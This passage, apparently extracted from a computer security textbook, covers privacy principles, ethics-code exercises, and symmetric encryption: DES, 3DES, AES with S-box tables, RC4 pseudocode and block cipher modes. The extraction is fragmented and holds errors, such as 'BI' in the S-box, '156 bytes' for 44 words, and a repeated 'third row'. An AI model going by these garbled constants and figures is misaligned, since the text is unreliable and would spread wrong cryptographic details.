b.	to have communicated to him, data relating to him within a reasonable time; at a charge, if any, that is
[Word Count: 25]

not excessive; in a reasonable manner; and in a form that is readily intelligible to him;
	
c.	to be given reasons if a request made under subparagraphs(a) and (b) is denied, and to be able to
[Word Count: 36]

challenge such denial; and
	
d.	to challenge data relating to him and, if the challenge is successful to have the data erased, rectified,
[Word Count: 23]

A data controller should be accountable for complying with measures which give effect to the principles  
stated above.
[Word Count: 18]

636    Chapter 19 / Legal and Ethical Aspects
[Word Count: 8]

19.8	
A management briefing lists the following as the top five actions that to improve pri-
vacy. Compare these recommendations to the Information Privacy Standard of Good 
Practice in Appendix H.4. Comment on the differences.
1.	 Show visible and consistent management support.
2.	 Establish privacy responsibilities. Privacy requirements need to be incorporated
[Word Count: 52]

into any position that handles personally identifiable information (PII).
3.	 Incorporate privacy and security into the systems and application life cycle. This
[Word Count: 22]

includes a formal privacy impact assessment.
4.	 Provide continuous and effective awareness and training.
5.	 Encrypt moveable PII. This includes transmission as well as mobile devices.
[Word Count: 26]

rationale for excluding these.
b.	 Are there any elements in the 1997 Code not found in the 1982 Code? Propose a
[Word Count: 21]

rationale for adding these.
	19.12	
A copy of the IEEE Code Ethics from 1979 is available at box.com/compsec3e. Com-
pare this Code with the 2006 IEEE Code of Ethics (Figure 19.7).
a.	 Are there any elements in the 1979 Code not found in the 2006 Code? Propose a
[Word Count: 48]

rationale for excluding these.
b.	 Are there any elements in the 2006 Code not found in the 1979 Code? Propose a
[Word Count: 21]

rationale for adding these.
	19.13	
A copy of the 1999 Software Engineering Code of Ethics and Professional Practice 
(Version 5.2) as recommended by an ACM/IEEE-CS Joint Task Force is available at 
box.com/compsec3e. Compare this Code each of the three codes reproduced in this 
chapter (Figure 19.6 through 19.8). Comment in each case on the differences.
[Word Count: 55]

Cryptography
Cryptanalysis
Feistel Cipher Structure
[Word Count: 5]

Overview of the Algorithm
Algorithm Details
[Word Count: 6]

Stream Cipher Structure
The RC4 Algorithm
[Word Count: 6]

Electronic Codebook Mode
Cipher Block Chaining Mode
Cipher Feedback Mode
Counter Mode
[Word Count: 12]

20.6	 Location of Symmetric Encryption Devices
[Word Count: 6]

20.9	 Key Terms, Review Questions, and Problems
[Word Count: 7]

Symmetric Encryption and 
Message Confidentiality
[Word Count: 5]

638    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Explain the basic principles of symmetric encryption.
◆	Understand the significance of the Feistel cipher structure.
◆	Describe the structure and function of DES.
◆	Distinguish between two-key and three-key triple DES.
◆	Describe the structure and function of AES.
◆	Compare and contrast stream encryption and block cipher encryption.
◆	Distinguish among the major block cipher modes of operation.
◆	Discuss the issues involved in key distribution.
[Word Count: 69]

Symmetric encryption, also referred to as conventional encryption, secret-key, 
or single-key encryption, was the only type of encryption in use prior to the 
­development of public-key encryption in the late 1970s.1 It remains by far the most 
widely used of the two types of encryption.
[Word Count: 45]

This chapter begins with a look at a general model for the symmetric 
­encryption process; this will enable us to understand the context within which the 
­algorithms are used. Then we look at three important block encryption ­algorithms: 
DES, triple DES, and AES. Next, the chapter introduces symmetric stream 
encryption and describes the widely used stream cipher RC4. We then examine 
the application of these algorithms to achieve confidentiality.
[Word Count: 69]

At this point the reader should review Section 2.1. Recall that a symmetric 
­encryption scheme has five ingredients (Figure 2.1):
[Word Count: 20]

• Plaintext: This is the original message or data that is fed into the algorithm as input.
 
• Encryption algorithm: The encryption algorithm performs various ­substitutions
[Word Count: 26]

and transformations on the plaintext.
 
• Secret key: The secret key is also input to the algorithm. The exact ­substitutions
[Word Count: 20]

and transformations performed by the algorithm depend on the key.
 
• Ciphertext: This is the scrambled message produced as output. It depends on
[Word Count: 23]

the plaintext and the secret key. For a given message, two different keys will 
produce two different ciphertexts.
 
• Decryption algorithm: This is essentially the encryption algorithm run in
[Word Count: 29]

­reverse. It takes the ciphertext and the same secret key and produces the 
­original plaintext.
[Word Count: 15]

1Public-key encryption was first described in the open literature in 1976; the National Security Agency 
(NSA) claims to have discovered it some years earlier.
[Word Count: 24]

20.1 / Symmetric Encryption Principles   639
[Word Count: 6]

Cryptographic systems are generically classified along three independent dimensions:
[Word Count: 9]

1.	 The type of operations used for transforming plaintext to ciphertext. All
[Word Count: 12]

encryption algorithms are based on two general principles: substitution, 
in which each element in the plaintext (bit, letter, group of bits or letters) 
is mapped into another element, and transposition, in which elements 
in the plaintext are rearranged. The fundamental requirement is that no 
­information be lost (i.e., that all operations be reversible). Most systems, 
­referred to as product systems, involve multiple stages of substitutions and 
transpositions.
	
2.	 The number of keys used. If both sender and receiver use the same key, the
[Word Count: 83]

system is referred to as symmetric, single-key, secret-key, or conventional 
encryption. If the sender and receiver each use a different key, the system is 
referred to as asymmetric, two-key, or public-key encryption.
	
3.	 The way in which the plaintext is processed. A block cipher processes the input
[Word Count: 47]

one block of elements at a time, producing an output block for each input 
block. A stream cipher processes the input elements continuously, ­producing 
output one element at a time, as it goes along.
[Word Count: 34]

The process of attempting to discover the plaintext or key is known as cryptanalysis. 
The strategy used by the cryptanalyst depends on the nature of the encryption scheme 
and the information available to the cryptanalyst.
[Word Count: 35]

640    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

If the analyst is able somehow to get the source system to insert into 
the system a message chosen by the analyst, then a chosen-plaintext attack is 
­possible. In general, if the analyst is able to choose the messages to encrypt, 
the analyst may deliberately pick patterns that can be expected to reveal the 
structure of the key.
[Word Count: 58]

Table 20.1 lists two other types of attack: chosen ciphertext and chosen text. 
These are less commonly employed as cryptanalytic techniques but are nevertheless 
possible avenues of attack.
[Word Count: 28]

Only relatively weak algorithms fail to withstand a ciphertext-only attack. 
Generally, an encryption algorithm is designed to withstand a known-plaintext 
attack.
[Word Count: 21]

An encryption scheme is computationally secure if the ciphertext generated 
by the scheme meets one or both of the following criteria:
[Word Count: 21]

• The cost of breaking the cipher exceeds the value of the encrypted information.
 
• The time required to break the cipher exceeds the useful lifetime of the
[Word Count: 28]

Table 20.1  Types of Attacks on Encrypted Messages
[Word Count: 8]

Ciphertext only
•  Encryption algorithm
•  Ciphertext to be decoded
[Word Count: 10]

Known plaintext
•  Encryption algorithm
•  Ciphertext to be decoded
•  One or more plaintext-ciphertext pairs formed with the secret key
[Word Count: 21]

Chosen plaintext
•  Encryption algorithm
•  Ciphertext to be decoded
•  Plaintext message chosen by cryptanalyst, together with its corresponding cipher-
[Word Count: 21]

Chosen ciphertext
•  Encryption algorithm
•  Ciphertext to be decoded
•   Purported ciphertext chosen by cryptanalyst, together with its corresponding
[Word Count: 21]

decrypted plaintext generated with the secret key
[Word Count: 7]

Chosen text
•  Encryption algorithm
•  Ciphertext to be decoded
•  Plaintext message chosen by cryptanalyst, together with its corresponding cipher-
[Word Count: 21]

text generated with the secret key
•  Purported ciphertext chosen by cryptanalyst, together with its corresponding
[Word Count: 16]

decrypted plaintext generated with the secret key
[Word Count: 7]

20.1 / Symmetric Encryption Principles   641
[Word Count: 6]

Unfortunately, it is very difficult to estimate the amount of effort required 
to cryptanalyze ciphertext successfully. However, assuming there are no inherent 
mathematical weaknesses in the algorithm, then a brute-force approach is indi-
cated, and here we can make some reasonable estimates about costs and time.
[Word Count: 46]

A brute-force approach involves trying every possible key until an intelligi-
ble translation of the ciphertext into plaintext is obtained. On average, half of all 
possible keys must be tried to achieve success. This type of attack is discussed in 
Section 2.1.
[Word Count: 42]

All rounds have the same structure. A substitution is performed on the left 
half of the data. This is done by applying a round function F to the right half of 
the data and then taking the exclusive-OR (XOR) of the output of that function 
and the left half of the data. The round function has the same general structure for 
each round but is parameterized by the round subkey Ki. Following this substitu-
tion, a permutation is performed that consists of the interchange of the two halves 
of the data.
[Word Count: 91]

The Feistel structure is a particular example of the more general structure 
used by all symmetric block ciphers. In general, a symmetric block cipher consists of 
a sequence of rounds, with each round performing substitutions and permutations 
conditioned by a secret key value. The exact realization of a symmetric block cipher 
depends on the choice of the following parameters and design features:
[Word Count: 62]

• Block size: Larger block sizes mean greater security (all other things being
[Word Count: 13]

equal) but reduced encryption/decryption speed. A block size of 128 bits 
is a reasonable tradeoff and is nearly universal among recent block cipher 
designs.
 
• Key size: Larger key size means greater security but may decrease ­encryption/
[Word Count: 37]

decryption speed. The most common key length in modern algorithms is  
128 bits.
 
• Number of rounds: The essence of a symmetric block cipher is that a single
[Word Count: 28]

round offers inadequate security but that multiple rounds offer increasing 
security. A typical size is 16 rounds.
 
• Subkey generation algorithm: Greater complexity in this algorithm should
[Word Count: 27]

lead to greater difficulty of cryptanalysis.
 
• Round function: Again, greater complexity generally means greater resistance
[Word Count: 16]

642    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

There are two other considerations in the design of a symmetric block cipher:
[Word Count: 13]

• Fast software encryption/decryption: In many cases, encryption is embedded in
[Word Count: 11]

­applications or utility functions in such a way as to preclude a hardware imple-
mentation. Accordingly, the speed of execution of the algorithm becomes a 
concern.
 
• Ease of analysis: Although we would like to make our algorithm as difficult as
[Word Count: 41]

possible to cryptanalyze, there is great benefit in making the algorithm easy to 
analyze. That is, if the algorithm can be concisely and clearly explained, it is 
easier to analyze that algorithm for cryptanalytic vulnerabilities and therefore
[Word Count: 37]

develop a higher level of assurance as to its strength. DES, for example, does 
not have an easily analyzed functionality.
[Word Count: 20]

Decryption with a symmetric block cipher is essentially the same as the 
­encryption process. The rule is as follows: Use the ciphertext as input to the 
­algorithm, but use the subkeys Ki in reverse order. That is, use Kn in the first round, 
Kn-1 in the ­second round, and so on until K1 is used in the last round. This is a nice 
feature because it means we need not implement two different algorithms, one for 
encryption and one for decryption.
[Word Count: 81]

The most commonly used symmetric encryption algorithms are block ciphers. 
A block cipher processes the plaintext input in fixed-size blocks and produces 
a block of ciphertext of equal size for each plaintext block. This section and 
the next focus on the three most important symmetric block ciphers: the Data 
Encryption Standard (DES), triple DES (3DES), and the Advanced Encryption 
Standard (AES).
[Word Count: 61]

The most widely used encryption scheme is based on the Data Encryption Standard 
(DES) adopted in 1977 by the National Bureau of Standards, now the National 
Institute of Standards and Technology (NIST), as Federal Information Processing 
Standard 46 (FIPS PUB 46). The algorithm itself is referred to as the Data 
Encryption Algorithm (DEA).2
[Word Count: 53]

The DES algorithm can be described as follows. The plaintext is 64 bits in 
length and the key is 56 bits in length; longer plaintext amounts are processed in 
64-bit blocks. The DES structure is a minor variation of the Feistel network shown 
in Figure 20.1. There are 16 rounds of processing. From the original 56-bit key, 16 
subkeys are generated, one of which is used for each round.
[Word Count: 69]

The process of decryption with DES is essentially the same as the encryp-
tion process. The rule is as follows: Use the ciphertext as input to the DES 
­algorithm, but use the subkeys Ki in reverse order. That is, use K16 on the first 
iteration, K15 on the second iteration, and so on until K1 is used on the sixteenth 
and last iteration.
[Word Count: 63]

Triple DES (3DES) was first standardized for use in financial applications in ANSI 
standard X9.17 in 1985. 3DES was incorporated as part of the Data Encryption 
Standard in 1999, with the publication of FIPS PUB 46-3.
[Word Count: 36]

2The terminology is a bit confusing. Until recently, the terms DES and DEA could be used interchange-
ably. However, the most recent edition of the DES document includes a specification of the DEA 
­described here plus the triple DEA (3DES) described subsequently. Both DEA and 3DES are part of the 
Data Encryption Standard. Further, until the recent adoption of the official term 3DES, the triple DEA 
algorithm was typically referred to as triple DES and written as 3DES. For the sake of convenience, we 
will use 3DES.
[Word Count: 87]

644    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

3DES uses three keys and three executions of the DES algorithm. The func-
tion follows an encrypt-decrypt-encrypt (EDE) sequence (Figure 20.2a):
[Word Count: 21]

C = ciphertext
P = plaintext
E[K, X] = encryption of X using key K
D[K, Y] = decryption of Y using key K
[Word Count: 24]

Decryption is simply the same operation with the keys reversed (Figure 20.2b):
[Word Count: 12]

There is no cryptographic significance to the use of decryption for the second 
stage of 3DES encryption. Its only advantage is that it allows users of 3DES to 
decrypt data encrypted by users of the older single DES:
[Word Count: 38]

With three distinct keys, 3DES has an effective key length of 168 bits. FIPS 
46-3 also allows for the use of two keys, with K1 = K3; this provides for a key length 
of 112 bits. FIPS 46-3 includes the following guidelines for 3DES:
[Word Count: 44]

• 3DES is the FIPS approved symmetric encryption algorithm of choice.
 
• The original DES, which uses a single 56-bit key, is permitted under the
[Word Count: 25]

standard for legacy systems only. New procurements should support 3DES.
 
• Government organizations with legacy DES systems are encouraged to transi-
[Word Count: 21]

tion to 3DES.
 
• It is anticipated that 3DES and the Advanced Encryption Standard (AES)
[Word Count: 15]

will coexist as FIPS-approved algorithms, allowing for a gradual transition 
to AES.
[Word Count: 12]

20.3 / Advanced Encryption Standard   645
[Word Count: 6]

It is easy to see that 3DES is a formidable algorithm. Because the underlying 
cryptographic algorithm is DEA, 3DES can claim the same resistance to cryptanaly-
sis based on the algorithm as is claimed for DEA. Further, with a 168-bit key length, 
brute-force attacks are effectively impossible.
[Word Count: 47]

Ultimately, AES is intended to replace 3DES, but this process will take a 
number of years. NIST anticipates that 3DES will remain an approved algorithm 
(for U.S. government use) for the foreseeable future.
[Word Count: 33]

The Advanced Encryption Standard (AES) was issued as a federal information pro-
cessing standard (FIPS 197). It is intended to replace DES and triple DES with an 
algorithm that is more secure and efficient.
[Word Count: 34]

AES uses a block length of 128 bits and a key length that can be 128, 192, or 256 bits. 
In the description of this section, we assume a key length of 128 bits, which is likely 
to be the one most commonly implemented.
[Word Count: 44]

The following comments give some insight into AES:
[Word Count: 8]

1.	 One noteworthy feature of this structure is that it is not a Feistel structure.
[Word Count: 15]

Recall that in the classic Feistel structure, half of the data block is used to 
modify the other half of the data block, and then the halves are swapped. AES 
does not use a Feistel structure but processes the entire data block in parallel 
during each round using substitutions and permutation.
[Word Count: 51]

2.	 The key that is provided as input is expanded into an array of forty-four 32-bit
[Word Count: 16]

words, w[i]. Four distinct words (128 bits) serve as a round key for each round.
	
3.	 Four different stages are used, one of permutation and three of substitution:
[Word Count: 28]

• Substitute Bytes: Uses a table, referred to as an S-box,3 to perform a byte-
[Word Count: 15]

by-byte substitution of the block
 
• Shift Rows: A simple permutation that is performed row by row
[Word Count: 17]

3The term S-box, or substitution box, is commonly used in the description of symmetric ciphers to refer to 
a table used for a table-lookup type of substitution mechanism.
[Word Count: 28]

646    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

• Mix Columns: A substitution that alters each byte in a column as a function
[Word Count: 15]

of all of the bytes in the column
 
• Add Round key: A simple bitwise XOR of the current block with a portion
[Word Count: 23]

4.	 The structure is quite simple. For both encryption and decryption, the cipher
[Word Count: 13]

begins with an Add Round Key stage, followed by nine rounds that each 
includes all four stages, followed by a tenth round of three stages. Figure 20.4 
depicts the structure of a full encryption round.
[Word Count: 35]

Figure 20.3  AES Encryption and Decryption
[Word Count: 6]

20.3 / Advanced Encryption Standard   647
[Word Count: 6]

S
S
S
S
S
S
S
S
S
S
S
S
S
S
S
S
SubBytes
[Word Count: 17]

r0
r1
r2
r3
r4
r5
r6
r7
r8
r9
r10
r11
r12
r13
r14
r15
[Word Count: 16]

5.	 Only the Add Round Key stage makes use of the key. For this reason, the
[Word Count: 16]

cipher begins and ends with an Add Round Key stage. Any other stage, 
applied at the beginning or end, is reversible without knowledge of the key 
and so would add no security.
	
6.	 The Add Round Key stage by itself would not be formidable. The other three
[Word Count: 47]

stages together scramble the bits, but by themselves would provide no security 
because they do not use the key. We can view the cipher as alternating opera-
tions of XOR encryption (Add Round Key) of a block, followed by scram-
bling of the block (the other three stages), followed by XOR encryption, and 
so on. This scheme is both efficient and highly secure.
	
7.	 Each stage is easily reversible. For the Substitute Byte, Shift Row, and Mix
[Word Count: 77]

Columns stages, an inverse function is used in the decryption algorithm. For 
the Add Round Key stage, the inverse is achieved by XORing the same round 
key to the block, using the result that A ⊕A ⊕B = B.
	
8.	 As with most block ciphers, the decryption algorithm makes use of the
[Word Count: 52]

expanded key in reverse order. However, the decryption algorithm is not 
identical to the encryption algorithm. This is a consequence of the particular 
structure of AES.
[Word Count: 26]

648    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

9.	 Once it is established that all four stages are reversible, it is easy to verify
[Word Count: 16]

that decryption does recover the plaintext. Figure 20.3 lays out encryption 
and decryption going in opposite vertical directions. At each horizontal point 
(e.g., the dashed line in the figure), State is the same for both encryption and 
decryption.
	 10.	 The final round of both encryption and decryption consists of only three
[Word Count: 51]

stages. Again, this is a consequence of the particular structure of AES and is 
required to make the cipher reversible.
[Word Count: 20]

We now look briefly at the principal elements of AES in more detail.
[Word Count: 13]

Here is an example of the SubBytes transformation:
The S-box is constructed using properties of finite fields. The topic of finite 
fields is beyond the scope of this book; it is discussed in detail in [STAL14a].
[Word Count: 36]

4In FIPS PUB 197, a hexadecimal number is indicated by enclosing it in curly brackets. We use that 
­convention.
[Word Count: 19]

The inverse substitute byte transformation, called InvSubBytes, makes use of 
the inverse S-box shown in Table 20.2b. Note, for example, that the input {2A} pro-
duces the output {95}, and the input {95} to the S-box produces {2A}.
[Word Count: 38]

The S-box is designed to be resistant to known cryptanalytic attacks. 
Specifically, the AES developers sought a design that has a low correlation between 
input bits and output bits and the property that the output cannot be described as a 
simple mathematical function of the input.
[Word Count: 46]

Shift Row Transformation  For the forward shift row transformation, called 
ShiftRows, the first row of State is not altered. For the second row, a 1-byte circular
[Word Count: 26]

20.3 / Advanced Encryption Standard   649
[Word Count: 6]

0
52
09
6A
D5
30
36
A5
38
BF
40
A3
9E
81
F3
D7
FB
[Word Count: 17]

1
7C
E3
39
82
9B
2F
FF
87
34
8E
43
44
C4
DE
E9
CB
[Word Count: 17]

2
54
7B
94
32
A6
C2
23
3D
EE
4C
95
0B
42
FA
C3
4E
[Word Count: 17]

3
08
2E
A1
66
28
D9
24
B2
76
5B
A2
49
6D
8B
D1
25
[Word Count: 17]

4
72
F8
F6
64
86
68
98
16
D4
A4
5C
CC
5D
65
B6
92
[Word Count: 17]

5
6C
70
48
50
FD
ED
B9
DA
5E
15
46
57
A7
8D
9D
84
[Word Count: 17]

6
90
D8
AB
00
8C
BC
D3
0A
F7
E4
58
05
B8
B3
45
06
[Word Count: 17]

7
D0
2C
1E
8F
CA
3F
0F
02
C1
AF
BD
03
01
13
8A
6B
[Word Count: 17]

8
3A
91
11
41
4F
67
DC
EA
97
F2
CF
CE
F0
B4
E6
73
[Word Count: 17]

9
96
AC
74
22
E7
AD
35
85
E2
F9
37
E8
1C
75
DF
6E
[Word Count: 17]

A
47
F1
1A
71
1D
29
C5
89
6F
B7
62
0E
AA
18
BE
1B
[Word Count: 17]

B
FC
56
3E
4B
C6
D2
79
20
9A
DB
C0
FE
78
CD
5A
FA
[Word Count: 17]

C
1F
DD
A8
33
88
07
C7
31
B1
12
10
59
27
80
EC
5F
[Word Count: 17]

D
60
51
7F
A9
19
B5
4A
0D
2D
E5
7A
9F
93
C9
9C
EF
[Word Count: 17]

E
A0
E0
3B
4D
AE
2A
F5
B0
C8
EB
BB
3C
83
53
99
61
[Word Count: 17]

F
17
2B
04
7E
BA
77
D6
26
E1
69
14
63
55
21
0C
7D
[Word Count: 17]

0
63
7C
77
7B
F2
6B
6F
C5
30
01
67
2B
FE
D7
AB
76
[Word Count: 17]

1
CA
82
C9
7D
FA
59
47
F0
AD
D4
A2
AF
9C
A4
72
C0
[Word Count: 17]

2
B7
FD
93
26
36
3F
F7
CC
34
A5
E5
F1
71
D8
31
15
[Word Count: 17]

3
04
C7
23
C3
18
96
05
9A
07
12
80
E2
EB
27
B2
75
[Word Count: 17]

4
09
83
2C
1A
1B
6E
5A
A0
52
3B
D6
B3
29
E3
2F
84
[Word Count: 17]

5
53
D1
00
ED
20
FC
BI
5B
6A
CB
BE
39
4A
4C
58
CF
[Word Count: 17]

6
D0
EF
AA
FB
43
4D
33
85
45
F9
02
7F
50
3C
9F
A8
[Word Count: 17]

7
51
A3
40
8F
92
9D
38
F5
BC
B6
DA
21
10
FF
F3
D2
[Word Count: 17]

8
CD
0C
13
EC
5F
97
44
17
C4
A7
7E
3D
64
5D
19
73
[Word Count: 17]

9
60
81
4F
DC
22
2A
90
88
46
EE
B8
14
DE
5E
0B
DB
[Word Count: 17]

A
E0
32
3A
0A
49
06
24
5C
C2
D3
AC
62
91
95
E4
79
[Word Count: 17]

B
E7
C8
37
6D
8D
D5
4E
A9
6C
56
F4
EA
65
7A
AE
08
[Word Count: 17]

C
BA
78
25
2E
1C
A6
B4
C6
E8
DD
74
1F
4B
BD
8B
8A
[Word Count: 17]

D
70
3E
B5
66
48
03
F6
0E
61
35
57
B9
86
C1
1D
9E
[Word Count: 17]

E
E1
F8
98
11
69
D9
8E
94
9B
1E
87
E9
CE
55
28
DF
[Word Count: 17]

F
8C
A1
89
0D
BF
E6
42
68
41
99
2D
0F
B0
54
BB
16
[Word Count: 17]

650    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

left shift is performed. For the third row, a 2-byte circular left shift is performed. 
For the third row, a 3-byte circular left shift is performed. The following is an 
example of ShiftRows:
[Word Count: 33]

The inverse shift row transformation, called InvShiftRows, performs the cir-
cular shifts in the opposite direction for each of the last three rows, with a 1-byte 
circular right shift for the second row, and so on.
[Word Count: 36]

Mix Column Transformation  The forward mix column transformation, 
called MixColumns, operates on each column individually. Each byte of a column 
is mapped into a new value that is a function of all 4 bytes in the column. The 
mapping makes use of equations over finite fields. The following is an example of 
MixColumns:
[Word Count: 53]

The mapping is designed to provide a good mixing among the bytes of each 
column. The mix column transformation combined with the shift row transforma-
tion ensures that after a few rounds, all output bits depend on all input bits.
[Word Count: 40]

Add Round Key Transformation 
In the forward add round key 
transformation, called AddRoundKey, the 128 bits of State are bitwise XORed 
with the 128 bits of the round key. The operation is viewed as a column-wise
[Word Count: 36]

The first matrix is State, and the second matrix is the round key.
The inverse add round key transformation is identical to the forward add 
round key transformation, because the XOR operation is its own inverse.
[Word Count: 36]

The add round key transformation is as simple as possible and affects every 
bit of State. The complexity of the round key expansion, plus the complexity of the 
other stages of AES, ensure security.
[Word Count: 34]

AES Key Expansion  The AES key expansion algorithm takes as input a 4-word 
(16-byte) key and produces a linear array of 44 words (156 bytes). This is sufficient 
to provide a 4-word round key for the initial Add Round Key stage and each of the 
10 rounds of the cipher.
[Word Count: 50]

The key is copied into the first four words of the expanded key. The remain-
der of the expanded key is filled in four words at a time. Each added word w[i] 
depends on the immediately preceding word, w[i - 1], and the word four posi-
tions back, w[i - 4]. A complex finite-field algorithm is used in generating the 
expanded key.
[Word Count: 62]

A block cipher processes the input one block of elements at a time, ­producing an 
output block for each input block. A stream cipher processes the input ­elements 
continuously, producing output one element at a time, as it goes along. Although 
block ciphers are far more common, there are certain applications in which a stream 
cipher is more appropriate. Examples are given subsequently in this book. In this 
section, we look at perhaps the most popular symmetric stream cipher, RC4. We 
begin with an overview of stream cipher structure and then examine RC4.
[Word Count: 93]

A typical stream cipher encrypts plaintext 1 byte at a time, although a stream cipher 
may be designed to operate on 1 bit at a time or on units larger than a byte at 
a time. Figure 2.3b is a representative diagram of stream cipher structure. In this
[Word Count: 48]

operation between the four bytes of a State column and one word of the round 
key; it can also be viewed as a byte-level operation. The following is an example 
of AddRoundKey:
[Word Count: 32]

652    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

structure a key is input to a pseudorandom bit generator that produces a stream of 
8-bit numbers that are apparently random. A pseudorandom stream is one that is 
­unpredictable without knowledge of the input key and that has an apparently ran-
dom character. The output of the generator, called a keystream, is combined 1 byte 
at a time with the plaintext stream using the bitwise exclusive-OR (XOR) opera-
tion. For example, if the next byte generated by the generator is 01101100 and the 
next plaintext byte is 11001100, then the resulting ciphertext byte is:
[Word Count: 94]

11001100     plaintext
 ⊕01101100     key stream
[Word Count: 5]

Decryption requires the use of the same pseudorandom sequence:
[Word Count: 9]

10100000     ciphertext
 ⊕01101100     key stream
[Word Count: 5]

For applications that require encryption/decryption of a stream of data, such as 
over a data communications channel or a browser/Web link, a stream cipher might 
be the better alternative. For applications that deal with blocks of data, such as file 
transfer, e-mail, and database, block ciphers may be more appropriate. However, 
either type of cipher can be used in virtually any application.
[Word Count: 62]

Table 20.3  Speed Comparisons of Symmetric Ciphers on a Pentium 4
[Word Count: 11]

Source: http://www.cryptopp.com/benchmarks.html
[Word Count: 2]

The RC4 algorithm is remarkably simple and quite easy to explain. A variable- 
length key of from 1 to 256 bytes (8 to 2048 bits) is used to initialize a 256-byte 
state vector S, with elements S[0], S[1], . . . , S[255]. At all times, S contains a per-
mutation of all 8-bit numbers from 0 through 255. For encryption and decryption, 
a byte k (see Figure 2.3b) is generated from S by selecting one of the 255 entries 
in a systematic fashion. As each value of k is generated, the entries in S are once 
again permuted.
[Word Count: 99]

Initialization of S  To begin, the entries of S are set equal to the values from 
0 through 255 in ascending order; that is, S[0] = 0, S[1] = 1, . . . , S[255] = 255. 
A temporary vector, T, is also created. If the length of the key K is 256 bytes, 
then K is transferred to T. Otherwise, for a key of length keylen bytes, the first 
keylen elements of T are copied from K and then K is repeated as many times 
as necessary to fill out T. These preliminary operations can be summarized as 
follows:
[Word Count: 100]

/* Initialization */
for i = 0 to 255 do
S[i] =i;
T[i] = K[i mod keylen];
[Word Count: 17]

Next we use T to produce the initial permutation of S. This involves starting 
with S[0] and going through to S[255], and, for each S[i], swapping S[i] with another 
byte in S according to a scheme dictated by T[i]:
[Word Count: 39]

/* Initial Permutation of S */
j = 0;
for i = 0 to 255 do
[Word Count: 16]

j = (j + S[i] + T[i]) mod 256;
Swap (S[i], S[j]);
[Word Count: 12]

Because the only operation on S is a swap, the only effect is a permutation. 
S still contains all the numbers from 0 through 255.
[Word Count: 25]

654    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

Stream Generation  Once the S vector is initialized, the input key is no longer 
used. Stream generation involves cycling through all the elements of S[i], and, for 
each S[i], swapping S[i] with another byte in S according to a scheme dictated by the 
current configuration of S. After S[255] is reached, the process continues, starting 
over again at S[0]:
[Word Count: 59]

/* Stream Generation */
i, j = 0;
while (true)
[Word Count: 10]

i = (i + 1) mod 256;
j = (j + S[i]) mod 256;
Swap (S[i], S[j]);
t = (S[i] + S[j]) mod 256;
k = S[t];
[Word Count: 27]

To encrypt, XOR the value k with the next byte of plaintext. To decrypt, XOR 
the value k with the next byte of ciphertext.
[Word Count: 24]

Strength of RC4  A number of papers have been published analyzing methods of 
attacking RC4. None of these approaches is practical against RC4 with a reasonable 
key length, such as 128 bits. A more serious problem is reported in [FLUH01]. The
[Word Count: 41]

20.5 / Cipher Block Modes of Operation   655
[Word Count: 8]

authors demonstrate that the WEP protocol, intended to provide confidentiality 
on 802.11 wireless LAN networks, is vulnerable to a particular attack approach. In 
essence, the problem is not with RC4 itself but the way in which keys are generated 
for use as input to RC4. This particular problem does not appear to be relevant to 
other applications using RC4 and can be remedied in WEP by changing the way 
in which keys are generated. This problem points out the difficulty in designing a 
secure system that involves both cryptographic functions and protocols that make 
use of them.
[Word Count: 97]

The simplest way to proceed is what is known as electronic codebook (ECB) mode, 
in which plaintext is handled b bits at a time and each block of plaintext is encrypted 
using the same key (Figure 2.3a). The term codebook is used because, for a given
[Word Count: 46]

Table 20.4  Block Cipher Modes of Operation
[Word Count: 7]

Each block of 64 plaintext bits is encoded 
­independently using the same key.
[Word Count: 13]

The input to the encryption algorithm is the XOR of 
the next 64 bits of plaintext and the preceding 64 bits 
of ciphertext.
[Word Count: 23]

Input is processed s bits at a time. Preceding cipher-
text is used as input to the encryption algorithm to 
produce pseudorandom output, which is XORed 
with plaintext to produce next unit of ciphertext.
[Word Count: 34]

Similar to CFB, except that the input to the 
­encryption algorithm is the preceding DES output.
[Word Count: 16]

over noisy channel (e.g., satel-
lite communication)
[Word Count: 7]

Counter (CTR)
Each block of plaintext is XORed with an encrypted 
counter. The counter is incremented for each subse-
quent block.
[Word Count: 21]

656    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

key, there is a unique ciphertext for every b-bit block of plaintext. Therefore, one 
can imagine a gigantic codebook in which there is an entry for every possible b-bit 
plaintext pattern showing its corresponding ciphertext.
[Word Count: 35]

To overcome the security deficiencies of ECB, we would like a technique in 
which the same plaintext block, if repeated, produces different ciphertext blocks.
[Word Count: 24]

In the cipher block chaining (CBC) mode (Figure 20.6), the input to the encryption 
algorithm is the XOR of the current plaintext block and the preceding ciphertext 
block; the same key is used for each block. In effect, we have chained together the 
processing of the sequence of plaintext blocks. The input to the encryption func-
tion for each plaintext block bears no fixed relationship to the plaintext block. 
Therefore, repeating patterns of b-bits are not exposed.
[Word Count: 77]

Figure 20.6  Cipher Block Chaining (CBC) Mode
[Word Count: 7]

20.5 / Cipher Block Modes of Operation   657
[Word Count: 8]

For decryption, each cipher block is passed through the decryption algorithm. 
The result is XORed with the preceding ciphertext block to produce the plaintext 
block. To see that this works, we can write
[Word Count: 33]

where E[K, X] is the encryption of plaintext X using key K, and ⊕is the exclusive-
OR operation. Then
[Word Count: 19]

D(K, Cj) = Cj -1 ⊕Pj
Cj -1 ⊕D(K, Cj) = Cj -1 ⊕Cj -1 ⊕Pj = Pj
[Word Count: 18]

To produce the first block of ciphertext, an initialization vector (IV) is XORed 
with the first block of plaintext. On decryption, the IV is XORed with the output of 
the decryption algorithm to recover the first block of plaintext.
[Word Count: 39]

The IV must be known to both the sender and receiver. For maximum secu-
rity, the IV should be protected as well as the key. This could be done by sending 
the IV using ECB encryption. One reason for protecting the IV is as follows: If an 
opponent is able to fool the receiver into using a different value for IV, then the 
opponent is able to invert selected bits in the first block of plaintext. To see this, 
consider the following:
[Word Count: 82]

Now use the notation that X[j] denotes the jth bit of the b-bit quantity X. Then
[Word Count: 16]

Then, using the properties of XOR, we can state
[Word Count: 9]
